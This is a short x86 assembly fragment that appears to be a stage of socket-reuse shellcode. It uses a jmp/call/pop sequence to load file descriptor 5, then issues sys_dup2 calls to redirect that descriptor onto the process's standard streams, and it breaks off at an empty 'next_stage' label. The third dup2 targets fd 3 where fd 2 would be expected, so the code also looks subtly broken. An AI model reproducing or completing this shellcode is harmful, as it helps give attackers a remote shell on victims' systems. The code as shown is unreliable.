.section .text
.global _start

_start:
    jmp end
begin:
    popl %esi
    movl (%esi), %edi

dup2:
    mov $0x3f, %eax # sys_dup2(int oldfd, int newfd)
    mov %edi, %ebx #int olddf
    mov $0x00, %ecx #int newfd
    int $0x80

    mov $0x3f, %eax # sys_dup2(int oldfd, int newfd)
    mov %edi, %ebx #int olddf
    mov $0x01, %ecx #int newfd
    int $0x80

    mov $0x3f, %eax # sys_dup2(int oldfd, int newfd)
    mov %edi, %ebx #int olddf
    mov $0x03, %ecx #int newfd
    int $0x80

    jmp next_stage

end:
    call begin

fd:
.long 5

next_stage:

